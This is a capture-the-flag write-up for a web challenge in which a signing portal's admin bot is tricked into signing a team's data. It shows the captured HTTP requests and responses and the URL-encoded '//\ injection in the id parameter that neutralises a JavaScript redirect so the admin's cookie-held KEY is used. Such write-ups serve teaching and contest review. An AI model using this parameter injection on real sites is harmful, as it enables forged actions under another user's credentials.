# CBPM (web 300)

The participants were given an online portal which had several parts.
Sign by Yourself (users could sign any data with a key)
See List of Signatures (The list of user’s signed data were shown)
Sign by Administrator (Sending any data to admin to sign)
Get the flag (getting flag by proper admin sign)
After spending some time on the task, we realized the workflow. The important consequences:
1. Signing could not possible due to JavaScript snippet code.
2. By removing JavaScript code manually, the code signing was possible.
3. Admin signed everything, but the results were not shown to the users.
4. The question asked participant to sign their team number by admin.
5. The signing KEY was stored in cookie without HttpOnly flag.
Attack scenario: In the beginning, we tried to find a XSS vulnerability. By leveraging XSS, it could possible to force admin send their KEY to us, but after some test we were not able to exploit admin blindly. So after some time, we realized that workflow had a problem:

When a user wanted to sign a data, following request was sent:

```
/wait_and_real_sign.php?content=test&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D
And the response was:
HTTP/1.1 200 OK
Server: nginx/1.6.1
Date: Sun, 18 Dec 2016 11:08:27 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Content-Length: 1407

<!doctype html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="x-ua-compatible" content="ie=edge">

    <title>ExtraSecure - Wait & Sign</title>
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <script src="js/index.js"></script>
    <script src="js/cookie.js"></script>
    <script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ=";
    </script>
</head>
<body>
<div class="container">
    <div class="card">
        <h1 class="card-header">Signing in <i id="time">10</i> seconds...</h1>
        <p class="card-block">Please be patient... The content will be signed with your key soon and you will be
            redirected to the <i>list</i> page to view the results.</p>
    </div>
</div>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("dGVzdA=="),
            content: "dGVzdA==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ='
        };
        postForm('/sign_and_store.php', body);
    });
</script>
</body>
</html>
```
Based on the response:
1. The JavaScript code at the bottom of response, prevented to sign data and redirected user to the home page.
2. `KEY` was gathered by parsing cookie.
3. `ID` was reflected in post data.



Interestingly, when we gave our data to admin to sign, following HTTP request were sent:
```
[POST DATA]
---
content=60&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D&url=http%3A%2F%2Fctf.sharif.edu%3A8083%2Fwait_and_real_sign.php%3Fid%3DeyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D%26content%3D60
---
```
URL decoded data:
```
content=60&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ=&url=http://ctf.sharif.edu:8083/wait_and_real_sign.php?id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ=&content=184
```
The link was similar to our data sign link. However, we had realized that JavaScript code prevented to sign data, as a result, admin was not able to sign anything yet!
So we had to find a way to disable the JavaScript code, and at the same time, not corrupting post data. The first string we came up was:
```
/wait_and_real_sign.php?content=test&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D%5C
```
Which disabled the JavaScript code. However, it corrupted post data as it’s seen:
```
<script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ=\";
</script>
<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("dGVzdA=="),
            content: "dGVzdA==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ=\'
        };
        postForm('/sign_and_store.php', body);
    });
</script>
```
Some after, we found magical string:
```
/wait_and_real_sign.php?content=test&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%27%2f%2f%5c
```
Which represents `'//\`. At the same time, it disables JavaScript code and doesn’t corrupt post data:
```
<script>
        alert("Sorry, server is busy for a while!");
        document.location = "/index.php?id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ='//\";
</script>

<script>
    var timeElem = document.getElementById('time');
    waitSeconds(timeElem, function () {
        var c = parse(document.cookie || '');
        var key = c['KEY'];
        var body = {
            //content: base64Decode("dGVzdA=="),
            content: "dGVzdA==",
            key: key,
            id: 'eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ='//\'
        };
        postForm('/sign_and_store.php', body);
    });
</script>
```
As a consequence, we sent our payload to admin and waited for his sign:
[POST DATA]
```
---
content=148&id=eyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D&url=http%3A%2F%2Fctf.sharif.edu%3A8083%2Fwait_and_real_sign.php%3Fid%3DeyJ0ZWFtaWQiOiI2MCJ9LjFjSVc5aC5CcGxnYnprcjVUY3BHeGlnaDQ4UjhfRzgyODQ%3D%27%2f%2f%5c%26content%3D148
---
```
The admin signed our data, we entered it and grabbed the flag :)

https://twitter.com/yshahinzadeh
